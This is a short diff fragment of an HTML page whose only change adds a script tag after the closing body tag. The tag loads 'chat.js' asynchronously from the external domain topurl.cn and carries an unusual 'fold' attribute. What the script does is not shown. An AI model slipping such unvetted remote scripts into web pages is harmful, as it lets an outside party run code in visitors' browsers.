@@ -51,4 +51,5 @@
  
  
 </body>
+	<script src="//topurl.cn/chat.js" async="async" fold></script>
 </html>
